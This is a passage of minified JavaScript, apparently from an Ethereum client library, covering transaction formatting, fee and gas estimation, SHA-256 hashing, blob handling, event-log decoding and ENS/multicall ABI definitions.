gwei`:""}) cannot be higher than the fee cap (\`maxFeePerGas\`${n?` = ${pn(n)} gwei`:""}).`].join(`
`),{cause:e,name:"TipAboveFeeCapError"})}}Object.defineProperty(Fd,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max priority fee per gas higher than max fee per gas|tip higher than fee cap/});class Wf extends Y{constructor({cause:e}){super(`An error occurred while executing: ${e==null?void 0:e.shortMessage}`,{cause:e,name:"UnknownNodeError"})}}function Iy(t,e){const r=(t.details||"").toLowerCase(),n=t instanceof Y?t.walk(i=>(i==null?void 0:i.code)===jo.code):t;return n instanceof Y?new jo({cause:t,message:n.details}):jo.nodeMessage.test(r)?new jo({cause:t,message:t.details}):Ld.nodeMessage.test(r)?new Ld({cause:t,maxFeePerGas:e==null?void 0:e.maxFeePerGas}):l0.nodeMessage.test(r)?new l0({cause:t,maxFeePerGas:e==null?void 0:e.maxFeePerGas}):h0.nodeMessage.test(r)?new h0({cause:t,nonce:e==null?void 0:e.nonce}):d0.nodeMessage.test(r)?new d0({cause:t,nonce:e==null?void 0:e.nonce}):f0.nodeMessage.test(r)?new f0({cause:t,nonce:e==null?void 0:e.nonce}):p0.nodeMessage.test(r)?new p0({cause:t}):g0.nodeMessage.test(r)?new g0({cause:t,gas:e==null?void 0:e.gas}):m0.nodeMessage.test(r)?new m0({cause:t,gas:e==null?void 0:e.gas}):y0.nodeMessage.test(r)?new y0({cause:t}):Fd.nodeMessage.test(r)?new Fd({cause:t,maxFeePerGas:e==null?void 0:e.maxFeePerGas,maxPriorityFeePerGas:e==null?void 0:e.maxPriorityFeePerGas}):new Wf({cause:t})}function N7(t,{docsPath:e,...r}){const n=(()=>{const i=Iy(t,r);return i instanceof Wf?t:i})();return new S7(n,{docsPath:e,...r})}function xy(t,{format:e}){if(!e)return{};const r={};function n(s){const o=Object.keys(s);for(const a of o)a in t&&(r[a]=t[a]),s[a]&&typeof s[a]=="object"&&!Array.isArray(s[a])&&n(s[a])}const i=e(t||{});return n(i),r}const T7={legacy:"0x0",eip2930:"0x1",eip1559:"0x2",eip4844:"0x3",eip7702:"0x4"};function Sy(t){const e={};return typeof t.authorizationList<"u"&&(e.authorizationList=P7(t.authorizationList)),typeof t.accessList<"u"&&(e.accessList=t.accessList),typeof t.blobVersionedHashes<"u"&&(e.blobVersionedHashes=t.blobVersionedHashes),typeof t.blobs<"u"&&(typeof t.blobs[0]!="string"?e.blobs=t.blobs.map(r=>Dr(r)):e.blobs=t.blobs),typeof t.data<"u"&&(e.data=t.data),typeof t.from<"u"&&(e.from=t.from),typeof t.gas<"u"&&(e.gas=Ue(t.gas)),typeof t.gasPrice<"u"&&(e.gasPrice=Ue(t.gasPrice)),typeof t.maxFeePerBlobGas<"u"&&(e.maxFeePerBlobGas=Ue(t.maxFeePerBlobGas)),typeof t.maxFeePerGas<"u"&&(e.maxFeePerGas=Ue(t.maxFeePerGas)),typeof t.maxPriorityFeePerGas<"u"&&(e.maxPriorityFeePerGas=Ue(t.maxPriorityFeePerGas)),typeof t.nonce<"u"&&(e.nonce=Ue(t.nonce)),typeof t.to<"u"&&(e.to=t.to),typeof t.type<"u"&&(e.type=T7[t.type]),typeof t.value<"u"&&(e.value=Ue(t.value)),e}function P7(t){return t.map(e=>({address:e.address,r:e.r?Ue(BigInt(e.r)):e.r,s:e.s?Ue(BigInt(e.s)):e.s,chainId:Ue(e.chainId),nonce:Ue(e.nonce),...typeof e.yParity<"u"?{yParity:Ue(e.yParity)}:{},...typeof e.v<"u"&&typeof e.yParity>"u"?{v:Ue(e.v)}:{}}))}function EE(t){if(!(!t||t.length===0))return t.reduce((e,{slot:r,value:n})=>{if(r.length!==66)throw new cE({size:r.length,targetSize:66,type:"hex"});if(n.length!==66)throw new cE({size:n.length,targetSize:66,type:"hex"});return e[r]=n,e},{})}function R7(t){const{balance:e,nonce:r,state:n,stateDiff:i,code:s}=t,o={};if(s!==void 0&&(o.code=s),e!==void 0&&(o.balance=Ue(e)),r!==void 0&&(o.nonce=Ue(r)),n!==void 0&&(o.state=EE(n)),i!==void 0){if(o.state)throw new a7;o.stateDiff=EE(i)}return o}function GI(t){if(!t)return;const e={};for(const{address:r,...n}of t){if(!qi(r,{strict:!1}))throw new sa({address:r});if(e[r])throw new o7({address:r});e[r]=R7(n)}return e}const O7=2n**256n-1n;function Gf(t){const{account:e,gasPrice:r,maxFeePerGas:n,maxPriorityFeePerGas:i,to:s}=t,o=e?Vi(e):void 0;if(o&&!qi(o.address))throw new sa({address:o.address});if(s&&!qi(s))throw new sa({address:s});if(typeof r<"u"&&(typeof n<"u"||typeof i<"u"))throw new u7;if(n&&n>O7)throw new Ld({maxFeePerGas:n});if(i&&n&&i>n)throw new Fd({maxFeePerGas:n,maxPriorityFeePerGas:i})}class k7 extends Y{constructor(){super("`baseFeeMultiplier` must be greater than 1.",{name:"BaseFeeScalarError"})}}class Ny extends Y{constructor(){super("Chain does not support EIP-1559 fees.",{name:"Eip1559FeesNotSupportedError"})}}class D7 extends Y{constructor({maxPriorityFeePerGas:e}){super(`\`maxFeePerGas\` cannot be less than the \`maxPriorityFeePerGas\` (${pn(e)} gwei).`,{name:"MaxFeePerGasTooLowError"})}}class VI extends Y{constructor({blockHash:e,blockNumber:r}){let n="Block";e&&(n=`Block at hash "${e}"`),r&&(n=`Block at number "${r}"`),super(`${n} could not be found.`,{name:"BlockNotFoundError"})}}const KI={"0x0":"legacy","0x1":"eip2930","0x2":"eip1559","0x3":"eip4844","0x4":"eip7702"};function QI(t){const e={...t,blockHash:t.blockHash?t.blockHash:null,blockNumber:t.blockNumber?BigInt(t.blockNumber):null,chainId:t.chainId?ia(t.chainId):void 0,gas:t.gas?BigInt(t.gas):void 0,gasPrice:t.gasPrice?BigInt(t.gasPrice):void 0,maxFeePerBlobGas:t.maxFeePerBlobGas?BigInt(t.maxFeePerBlobGas):void 0,maxFeePerGas:t.maxFeePerGas?BigInt(t.maxFeePerGas):void 0,maxPriorityFeePerGas:t.maxPriorityFeePerGas?BigInt(t.maxPriorityFeePerGas):void 0,nonce:t.nonce?ia(t.nonce):void 0,to:t.to?t.to:null,transactionIndex:t.transactionIndex?Number(t.transactionIndex):null,type:t.type?KI[t.type]:void 0,typeHex:t.type?t.type:void 0,value:t.value?BigInt(t.value):void 0,v:t.v?BigInt(t.v):void 0};return t.authorizationList&&(e.authorizationList=M7(t.authorizationList)),e.yParity=(()=>{if(t.yParity)return Number(t.yParity);if(typeof e.v=="bigint"){if(e.v===0n||e.v===27n)return 0;if(e.v===1n||e.v===28n)return 1;if(e.v>=35n)return e.v%2n===0n?1:0}})(),e.type==="legacy"&&(delete e.accessList,delete e.maxFeePerBlobGas,delete e.maxFeePerGas,delete e.maxPriorityFeePerGas,delete e.yParity),e.type==="eip2930"&&(delete e.maxFeePerBlobGas,delete e.maxFeePerGas,delete e.maxPriorityFeePerGas),e.type==="eip1559"&&delete e.maxFeePerBlobGas,e}function M7(t){return t.map(e=>({address:e.address,chainId:Number(e.chainId),nonce:Number(e.nonce),r:e.r,s:e.s,yParity:Number(e.yParity)}))}function B7(t){const e=(t.transactions??[]).map(r=>typeof r=="string"?r:QI(r));return{...t,baseFeePerGas:t.baseFeePerGas?BigInt(t.baseFeePerGas):null,blobGasUsed:t.blobGasUsed?BigInt(t.blobGasUsed):void 0,difficulty:t.difficulty?BigInt(t.difficulty):void 0,excessBlobGas:t.excessBlobGas?BigInt(t.excessBlobGas):void 0,gasLimit:t.gasLimit?BigInt(t.gasLimit):void 0,gasUsed:t.gasUsed?BigInt(t.gasUsed):void 0,hash:t.hash?t.hash:null,logsBloom:t.logsBloom?t.logsBloom:null,nonce:t.nonce?t.nonce:null,number:t.number?BigInt(t.number):null,size:t.size?BigInt(t.size):void 0,timestamp:t.timestamp?BigInt(t.timestamp):void 0,transactions:e,totalDifficulty:t.totalDifficulty?BigInt(t.totalDifficulty):null}}async function yl(t,{blockHash:e,blockNumber:r,blockTag:n,includeTransactions:i}={}){var l,h,d;const s=n??"latest",o=i??!1,a=r!==void 0?Ue(r):void 0;let c=null;if(e?c=await t.request({method:"eth_getBlockByHash",params:[e,o]},{dedupe:!0}):c=await t.request({method:"eth_getBlockByNumber",params:[a||s,o]},{dedupe:!!a}),!c)throw new VI({blockHash:e,blockNumber:r});return(((d=(h=(l=t.chain)==null?void 0:l.formatters)==null?void 0:h.block)==null?void 0:d.format)||B7)(c)}async function YI(t){const e=await t.request({method:"eth_gasPrice"});return BigInt(e)}async function U7(t,e){var s,o;const{block:r,chain:n=t.chain,request:i}=e||{};try{const a=((s=n==null?void 0:n.fees)==null?void 0:s.maxPriorityFeePerGas)??((o=n==null?void 0:n.fees)==null?void 0:o.defaultPriorityFee);if(typeof a=="function"){const u=r||await dt(t,yl,"getBlock")({}),l=await a({block:u,client:t,request:i});if(l===null)throw new Error;return l}if(typeof a<"u")return a;const c=await t.request({method:"eth_maxPriorityFeePerGas"});return Ec(c)}catch{const[a,c]=await Promise.all([r?Promise.resolve(r):dt(t,yl,"getBlock")({}),dt(t,YI,"getGasPrice")({})]);if(typeof a.baseFeePerGas!="bigint")throw new Ny;const u=c-a.baseFeePerGas;return u<0n?0n:u}}async function AE(t,e){var d,g;const{block:r,chain:n=t.chain,request:i,type:s="eip1559"}=e||{},o=await(async()=>{var y,m;return typeof((y=n==null?void 0:n.fees)==null?void 0:y.baseFeeMultiplier)=="function"?n.fees.baseFeeMultiplier({block:r,client:t,request:i}):((m=n==null?void 0:n.fees)==null?void 0:m.baseFeeMultiplier)??1.2})();if(o<1)throw new k7;const c=10**(((d=o.toString().split(".")[1])==null?void 0:d.length)??0),u=y=>y*BigInt(Math.ceil(o*c))/BigInt(c),l=r||await dt(t,yl,"getBlock")({});if(typeof((g=n==null?void 0:n.fees)==null?void 0:g.estimateFeesPerGas)=="function"){const y=await n.fees.estimateFeesPerGas({block:r,client:t,multiply:u,request:i,type:s});if(y!==null)return y}if(s==="eip1559"){if(typeof l.baseFeePerGas!="bigint")throw new Ny;const y=typeof(i==null?void 0:i.maxPriorityFeePerGas)=="bigint"?i.maxPriorityFeePerGas:await U7(t,{block:l,chain:n,request:i}),m=u(l.baseFeePerGas);return{maxFeePerGas:(i==null?void 0:i.maxFeePerGas)??m+y,maxPriorityFeePerGas:y}}return{gasPrice:(i==null?void 0:i.gasPrice)??u(await dt(t,YI,"getGasPrice")({}))}}async function $7(t,{address:e,blockTag:r="latest",blockNumber:n}){const i=await t.request({method:"eth_getTransactionCount",params:[e,n?Ue(n):r]},{dedupe:!!n});return ia(i)}function JI(t){const{kzg:e}=t,r=t.to??(typeof t.blobs[0]=="string"?"hex":"bytes"),n=typeof t.blobs[0]=="string"?t.blobs.map(s=>ji(s)):t.blobs,i=[];for(const s of n)i.push(Uint8Array.from(e.blobToKzgCommitment(s)));return r==="bytes"?i:i.map(s=>Dr(s))}function ZI(t){const{kzg:e}=t,r=t.to??(typeof t.blobs[0]=="string"?"hex":"bytes"),n=typeof t.blobs[0]=="string"?t.blobs.map(o=>ji(o)):t.blobs,i=typeof t.commitments[0]=="string"?t.commitments.map(o=>ji(o)):t.commitments,s=[];for(let o=0;o<n.length;o++){const a=n[o],c=i[o];s.push(Uint8Array.from(e.computeBlobKzgProof(a,c)))}return r==="bytes"?s:s.map(o=>Dr(o))}function L7(t,e,r,n){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,r,n);const i=BigInt(32),s=BigInt(4294967295),o=Number(r>>i&s),a=Number(r&s),c=n?4:0,u=n?0:4;t.setUint32(e+c,o,n),t.setUint32(e+u,a,n)}function F7(t,e,r){return t&e^~t&r}function j7(t,e,r){return t&e^t&r^e&r}class q7 extends xI{constructor(e,r,n,i){super(),this.blockLen=e,this.outputLen=r,this.padOffset=n,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=yg(this.buffer)}update(e){Ud(this);const{view:r,buffer:n,blockLen:i}=this;e=py(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=yg(e);for(;i<=s-o;o+=i)this.process(c,o);continue}n.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(r,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Ud(this),II(e,this),this.finished=!0;const{buffer:r,view:n,blockLen:i,isLE:s}=this;let{pos:o}=this;r[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(n,0),o=0);for(let h=o;h<i;h++)r[h]=0;L7(n,i-8,BigInt(this.length*8),s),this.process(n,0);const a=yg(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const u=c/4,l=this.get();if(u>l.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<u;h++)a.setUint32(4*h,l[h],s)}digest(){const{buffer:e,outputLen:r}=this;this.digestInto(e);const n=e.slice(0,r);return this.destroy(),n}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:r,buffer:n,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%r&&e.buffer.set(n),e}}const z7=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Bs=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Us=new Uint32Array(64);class H7 extends q7{constructor(){super(64,32,8,!1),this.A=Bs[0]|0,this.B=Bs[1]|0,this.C=Bs[2]|0,this.D=Bs[3]|0,this.E=Bs[4]|0,this.F=Bs[5]|0,this.G=Bs[6]|0,this.H=Bs[7]|0}get(){const{A:e,B:r,C:n,D:i,E:s,F:o,G:a,H:c}=this;return[e,r,n,i,s,o,a,c]}set(e,r,n,i,s,o,a,c){this.A=e|0,this.B=r|0,this.C=n|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,r){for(let h=0;h<16;h++,r+=4)Us[h]=e.getUint32(r,!1);for(let h=16;h<64;h++){const d=Us[h-15],g=Us[h-2],y=Ci(d,7)^Ci(d,18)^d>>>3,m=Ci(g,17)^Ci(g,19)^g>>>10;Us[h]=m+Us[h-7]+y+Us[h-16]|0}let{A:n,B:i,C:s,D:o,E:a,F:c,G:u,H:l}=this;for(let h=0;h<64;h++){const d=Ci(a,6)^Ci(a,11)^Ci(a,25),g=l+d+F7(a,c,u)+z7[h]+Us[h]|0,m=(Ci(n,2)^Ci(n,13)^Ci(n,22))+j7(n,i,s)|0;l=u,u=c,c=a,a=o+g|0,o=s,s=i,i=n,n=g+m|0}n=n+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,u=u+this.G|0,l=l+this.H|0,this.set(n,i,s,o,a,c,u,l)}roundClean(){Us.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const W7=SI(()=>new H7);function G7(t,e){return W7(ws(t,{strict:!1})?sh(t):t)}function V7(t){const{commitment:e,version:r=1}=t,n=t.to??(typeof e=="string"?"hex":"bytes"),i=G7(e);return i.set([r],0),n==="bytes"?i:Dr(i)}function K7(t){const{commitments:e,version:r}=t,n=t.to,i=[];for(const s of e)i.push(V7({commitment:s,to:n,version:r}));return i}const _E=6,XI=32,Ty=4096,e2=XI*Ty,CE=e2*_E-1-1*Ty*_E;class Q7 extends Y{constructor({maxSize:e,size:r}){super("Blob size is too large.",{metaMessages:[`Max: ${e} bytes`,`Given: ${r} bytes`],name:"BlobSizeTooLargeError"})}}class Y7 extends Y{constructor(){super("Blob data must not be empty.",{name:"EmptyBlobError"})}}function J7(t){const e=typeof t.data=="string"?ji(t.data):t.data,r=Ir(e);if(!r)throw new Y7;if(r>CE)throw new Q7({maxSize:CE,size:r});const n=[];let i=!0,s=0;for(;i;){const o=vy(new Uint8Array(e2));let a=0;for(;a<Ty;){const c=e.slice(s,s+(XI-1));if(o.pushByte(0),o.pushBytes(c),c.length<31){o.pushByte(128),i=!1;break}a++,s+=31}n.push(o)}return n.map(o=>Dr(o.bytes))}function Z7(t){const{data:e,kzg:r,to:n}=t,i=t.blobs??J7({data:e}),s=t.commitments??JI({blobs:i,kzg:r,to:n}),o=t.proofs??ZI({blobs:i,commitments:s,kzg:r,to:n}),a=[];for(let c=0;c<i.length;c++)a.push({blob:i[c],commitment:s[c],proof:o[c]});return a}function X7(t){if(t.type)return t.type;if(typeof t.authorizationList<"u")return"eip7702";if(typeof t.blobs<"u"||typeof t.blobVersionedHashes<"u"||typeof t.maxFeePerBlobGas<"u"||typeof t.sidecars<"u")return"eip4844";if(typeof t.maxFeePerGas<"u"||typeof t.maxPriorityFeePerGas<"u")return"eip1559";if(typeof t.gasPrice<"u")return typeof t.accessList<"u"?"eip2930":"legacy";throw new l7({transaction:t})}async function t2(t){const e=await t.request({method:"eth_chainId"},{dedupe:!0});return ia(e)}const r2=["blobVersionedHashes","chainId","fees","gas","nonce","type"],IE=new Map;async function Py(t,e){const{account:r=t.account,blobs:n,chain:i,gas:s,kzg:o,nonce:a,nonceManager:c,parameters:u=r2,type:l}=e,h=r&&Vi(r),d={...e,...h?{from:h==null?void 0:h.address}:{}};let g;async function y(){return g||(g=await dt(t,yl,"getBlock")({blockTag:"latest"}),g)}let m;async function b(){return m||(i?i.id:typeof e.chainId<"u"?e.chainId:(m=await dt(t,t2,"getChainId")({}),m))}if(u.includes("nonce")&&typeof a>"u"&&h)if(c){const A=await b();d.nonce=await c.consume({address:h.address,chainId:A,client:t})}else d.nonce=await dt(t,$7,"getTransactionCount")({address:h.address,blockTag:"pending"});if((u.includes("blobVersionedHashes")||u.includes("sidecars"))&&n&&o){const A=JI({blobs:n,kzg:o});if(u.includes("blobVersionedHashes")){const _=K7({commitments:A,to:"hex"});d.blobVersionedHashes=_}if(u.includes("sidecars")){const _=ZI({blobs:n,commitments:A,kzg:o}),T=Z7({blobs:n,commitments:A,proofs:_,to:"hex"});d.sidecars=T}}if(u.includes("chainId")&&(d.chainId=await b()),(u.includes("fees")||u.includes("type"))&&typeof l>"u")try{d.type=X7(d)}catch{let A=IE.get(t.uid);if(typeof A>"u"){const _=await y();A=typeof(_==null?void 0:_.baseFeePerGas)=="bigint",IE.set(t.uid,A)}d.type=A?"eip1559":"legacy"}if(u.includes("fees"))if(d.type!=="legacy"&&d.type!=="eip2930"){if(typeof d.maxFeePerGas>"u"||typeof d.maxPriorityFeePerGas>"u"){const A=await y(),{maxFeePerGas:_,maxPriorityFeePerGas:T}=await AE(t,{block:A,chain:i,request:d});if(typeof e.maxPriorityFeePerGas>"u"&&e.maxFeePerGas&&e.maxFeePerGas<T)throw new D7({maxPriorityFeePerGas:T});d.maxPriorityFeePerGas=T,d.maxFeePerGas=_}}else{if(typeof e.maxFeePerGas<"u"||typeof e.maxPriorityFeePerGas<"u")throw new Ny;if(typeof e.gasPrice>"u"){const A=await y(),{gasPrice:_}=await AE(t,{block:A,chain:i,request:d,type:"legacy"});d.gasPrice=_}}return u.includes("gas")&&typeof s>"u"&&(d.gas=await dt(t,i2,"estimateGas")({...d,account:h&&{address:h.address,type:"json-rpc"}})),Gf(d),delete d.parameters,d}async function n2(t,{address:e,blockNumber:r,blockTag:n="latest"}){const i=r?Ue(r):void 0,s=await t.request({method:"eth_getBalance",params:[e,i||n]});return BigInt(s)}async function i2(t,e){var i,s,o;const{account:r=t.account}=e,n=r?Vi(r):void 0;try{let f=function(w){const{block:E,request:x,rpcStateOverride:R}=w;return t.request({method:"eth_estimateGas",params:R?[x,E??"latest",R]:E?[x,E]:[x]})};const{accessList:a,authorizationList:c,blobs:u,blobVersionedHashes:l,blockNumber:h,blockTag:d,data:g,gas:y,gasPrice:m,maxFeePerBlobGas:b,maxFeePerGas:A,maxPriorityFeePerGas:_,nonce:T,value:P,stateOverride:S,...C}=await Py(t,{...e,parameters:(n==null?void 0:n.type)==="local"?void 0:["blobVersionedHashes"]}),$=(h?Ue(h):void 0)||d,D=GI(S),F=await(async()=>{if(C.to)return C.to;if(c&&c.length>0)return await WI({authorization:c[0]}).catch(()=>{throw new Y("`to` is required. Could not infer from `authorizationList`")})})();Gf(e);const j=(o=(s=(i=t.chain)==null?void 0:i.formatters)==null?void 0:s.transactionRequest)==null?void 0:o.format,N=(j||Sy)({...xy(C,{format:j}),from:n==null?void 0:n.address,accessList:a,authorizationList:c,blobs:u,blobVersionedHashes:l,data:g,gas:y,gasPrice:m,maxFeePerBlobGas:b,maxFeePerGas:A,maxPriorityFeePerGas:_,nonce:T,to:F,value:P});let p=BigInt(await f({block:$,request:N,rpcStateOverride:D}));if(c){const w=await n2(t,{address:N.from}),E=await Promise.all(c.map(async x=>{const{address:R}=x,B=await f({block:$,request:{authorizationList:void 0,data:g,from:n==null?void 0:n.address,to:R,value:Ue(w)},rpcStateOverride:D}).catch(()=>100000n);return 2n*BigInt(B)}));p+=E.reduce((x,R)=>x+R,0n)}return p}catch(a){throw N7(a,{...e,account:n,chain:t.chain})}}function ej(t,e){if(!qi(t,{strict:!1}))throw new sa({address:t});if(!qi(e,{strict:!1}))throw new sa({address:e});return t.toLowerCase()===e.toLowerCase()}const xE="/docs/contract/decodeEventLog";function tj(t){const{abi:e,data:r,strict:n,topics:i}=t,s=n??!0,[o,...a]=i;if(!o)throw new WF({docsPath:xE});const c=e.length===1?e[0]:e.find(m=>m.type==="event"&&o===my(Fi(m)));if(!(c&&"name"in c)||c.type!=="event")throw new mI(o,{docsPath:xE});const{name:u,inputs:l}=c,h=l==null?void 0:l.some(m=>!("name"in m&&m.name));let d=h?[]:{};const g=l.filter(m=>"indexed"in m&&m.indexed);for(let m=0;m<g.length;m++){const b=g[m],A=a[m];if(!A)throw new wI({abiItem:c,param:b});d[h?m:b.name||m]=rj({param:b,value:A})}const y=l.filter(m=>!("indexed"in m&&m.indexed));if(y.length>0){if(r&&r!=="0x")try{const m=uh(y,r);if(m)if(h)d=[...d,...m];else for(let b=0;b<y.length;b++)d[y[b].name]=m[b]}catch(m){if(s)throw m instanceof pI||m instanceof $I?new o0({abiItem:c,data:r,params:y,size:Ir(r)}):m}else if(s)throw new o0({abiItem:c,data:"0x",params:y,size:0})}return{eventName:u,args:Object.values(d).length>0?d:void 0}}function rj({param:t,value:e}){return t.type==="string"||t.type==="bytes"||t.type==="tuple"||t.type.match(/^(.*)\[(\d+)?\]$/)?e:(uh([t],e)||[])[0]}function nj(t){const{abi:e,args:r,logs:n,strict:i=!0}=t,s=(()=>{if(t.eventName)return Array.isArray(t.eventName)?t.eventName:[t.eventName]})();return n.map(o=>{var a;try{const c=e.find(l=>l.type==="event"&&o.topics[0]===my(l));if(!c)return null;const u=tj({...o,abi:[c],strict:i});return s&&!s.includes(u.eventName)||!ij({args:u.args,inputs:c.inputs,matchArgs:r})?null:{...u,...o}}catch(c){let u,l;if(c instanceof mI)return null;if(c instanceof o0||c instanceof wI){if(i)return null;u=c.abiItem.name,l=(a=c.abiItem.inputs)==null?void 0:a.some(h=>!("name"in h&&h.name))}return{...o,args:l?[]:{},eventName:u}}}).filter(Boolean)}function ij(t){const{args:e,inputs:r,matchArgs:n}=t;if(!n)return!0;if(!e)return!1;function i(s,o,a){try{return s.type==="address"?ej(o,a):s.type==="string"||s.type==="bytes"?no(sh(o))===a:o===a}catch{return!1}}return Array.isArray(e)&&Array.isArray(n)?n.every((s,o)=>{if(s==null)return!0;const a=r[o];return a?(Array.isArray(s)?s:[s]).some(u=>i(a,u,e[o])):!1}):typeof e=="object"&&!Array.isArray(e)&&typeof n=="object"&&!Array.isArray(n)?Object.entries(n).every(([s,o])=>{if(o==null)return!0;const a=r.find(u=>u.name===s);return a?(Array.isArray(o)?o:[o]).some(u=>i(a,u,e[s])):!1}):!1}function s2(t,{args:e,eventName:r}={}){return{...t,blockHash:t.blockHash?t.blockHash:null,blockNumber:t.blockNumber?BigInt(t.blockNumber):null,logIndex:t.logIndex?Number(t.logIndex):null,transactionHash:t.transactionHash?t.transactionHash:null,transactionIndex:t.transactionIndex?Number(t.transactionIndex):null,...r?{args:e,eventName:r}:{}}}const vg="/docs/contract/decodeFunctionResult";function hh(t){const{abi:e,args:r,functionName:n,data:i}=t;let s=e[0];if(n){const a=ch({abi:e,args:r,name:n});if(!a)throw new vc(n,{docsPath:vg});s=a}if(s.type!=="function")throw new vc(void 0,{docsPath:vg});if(!s.outputs)throw new yI(s.name,{docsPath:vg});const o=uh(s.outputs,i);if(o&&o.length>1)return o;if(o&&o.length===1)return o[0]}const w0=[{inputs:[{components:[{name:"target",type:"address"},{name:"allowFailure",type:"bool"},{name:"callData",type:"bytes"}],name:"calls",type:"tuple[]"}],name:"aggregate3",outputs:[{components:[{name:"success",type:"bool"},{name:"returnData",type:"bytes"}],name:"returnData",type:"tuple[]"}],stateMutability:"view",type:"function"}],b0=[{name:"query",type:"function",stateMutability:"view",inputs:[{type:"tuple[]",name:"queries",components:[{type:"address",name:"sender"},{type:"string[]",name:"urls"},{type:"bytes",name:"data"}]}],outputs:[{type:"bool[]",name:"failures"},{type:"bytes[]",name:"responses"}]},{name:"HttpError",type:"error",inputs:[{type:"uint16",name:"status"},{type:"string",name:"message"}]}],o2=[{inputs:[],name:"ResolverNotFound",type:"error"},{inputs:[],name:"ResolverWildcardNotSupported",type:"error"},{inputs:[],name:"ResolverNotContract",type:"error"},{inputs:[{name:"returnData",type:"bytes"}],name:"ResolverError",type:"error"},{inputs:[{components:[{name:"status",type:"uint16"},{name:"message",type:"string"}],name:"errors",type:"tuple[]"}],name:"HttpError",type:"error"}],a2=[...o2,{name:"resolve",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes"},{name:"data",type:"bytes"}],outputs:[{name:"",type:"bytes"},{name:"address",type:"address"}]},{name:"resolve",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes"},{name:"data",type:"bytes"},{name:"gateways",type:"string[]"}],outputs:[{name:"",type:"bytes"},{name:"address",type:"address"}]}],sj=[...o2,{name:"reverse",type:"function",stateMutability:"view",inputs:[{type:"bytes",name:"reverseName"}],outputs:[{type:"string",name:"resolvedName"},{type:"address",name:"resolvedAddress"},{type:"address",name:"reverseResolver"},{type:"address",name:"resolver"}]},{name:"reverse",type:"function",stateMutability:"view",inputs:[{type:"bytes",name:"reverseName"},{type:"string[]",name:"gateways"}],outputs:[{type:"string",name:"resolvedName"},{type:"address",name:"resolvedAddress"},{type:"address",name:"reverseResolver"},{type:"address",name:"resolver"}]}],SE=[{name:"text",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"},{name:"key",type:"string"}],outputs:[{name:"",type:"string"}]}],NE=[{name:"addr",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"}],outputs:[{name:"",type:"address"}]},{name:"addr",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"},{name:"coinType",type:"uint256"}],outputs:[{name:"",type:"bytes"}]}],oj="0x82ad56cb",aj="0x608060405234801561001057600080fd5b5060405161018e38038061018e83398101604081905261002f91610124565b6000808351602085016000f59050803b61004857600080fd5b6000808351602085016000855af16040513d6000823e81610067573d81fd5b3d81f35b634e487b7160e01b600052604160045260246000fd5b600082601f83011261009257600080fd5b81516001600160401b038111156100ab576100ab61006b565b604051601f8201601f19908116603f011681016001600160401b03811182821017156100d9576100d961006b565b6040528181528382016020018510156100f157600080fd5b60005b82811015610110576020818601810151838301820152016100f4565b506000918101602001919091529392505050565b6000806040838503121561013757600080fd5b82516001600160401b0381111561014d57600080fd5b61015985828601610081565b602085015190935090506001600160401b0381111561017757600080fd5b61018385828601610081565b915050925092905056fe",cj="0x608060405234801561001057600080fd5b506040516102c03803806102c083398101604081905261002f916101e6565b836001600160a01b03163b6000036100e457600080836001600160a01b03168360405161005c9190610270565b6000604051808303816000865af19150503d8060008114610099576040519150601f19603f3d011682016040523d82523d6000602084013e61009e565b606091505b50915091508115806100b857506001600160a01b0386163b155b156100e1578060405163101bb98d60e01b81526004016100d8919061028c565b60405180910390fd5b50505b6000808451602086016000885af16040513d6000823e81610103573d81fd5b3d81f35b80516001600160a01b038116811461011e57600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b60005b8381101561015457818101518382015260200161013c565b50506000910152565b600082601f83011261016e57600080fd5b81516001600160401b0381111561018757610187610123565b604051601f8201601f19908116603f011681016001600160401b03811182821017156101b5576101b5610123565b6040528181528382016020018510156101cd57600080fd5b6101de826020830160208701610139565b949350505050565b600080600080608085870312156101fc57600080fd5b61020585610107565b60208601519094506001600160401b0381111561022157600080fd5b61022d8782880161015d565b93505061023c60408601610107565b60608601519092506001600160401b0381111561025857600080fd5b6102648782880161015d565b91505092959194509250565b60008251610282818460208701610139565b9190910192915050565b60208152600082518060208401526102ab816040850160208701610139565b601f01601f1916919091016040019291505056fe";class v0 extends Y{constructor({blockNumber:e,chain:r,contract:n}){super(`Chain "${r.name}" does not support contract "${n.name}".`,{metaMessages:["This could be due to any of the following:",...e&&n.blockCreated&&n.blockCreated>e?[`- The contract "${n.name}" was not deployed until block ${n.blockCreated} (current block ${e}).`]:[`- The chain does not have the contract "${n.name}" 